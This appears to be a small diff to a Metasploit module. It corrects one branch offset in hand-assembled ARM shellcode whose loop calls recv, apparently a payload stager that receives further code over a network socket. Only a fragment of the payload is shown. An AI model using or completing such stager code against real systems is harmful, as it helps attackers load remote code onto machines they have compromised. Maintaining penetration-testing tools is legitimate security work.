@@ -89,7 +89,7 @@ module MetasploitModule
             0xef000000,          #        svc     0x00000000        ; invoke recv
             0xe3500000,          #        cmp     r0, #0
             0xba000005,          #        blt     817c <failed>
-            0xeafffff5,          #        b       80dc <loop>
+            0xeafffff4,          #        b       80dc <loop>
                                  #  last:
             0xe2822ffa,          #        add     r2, r2, #1000
             0xef000000,          #        svc     0x00000000        ; invoke recv
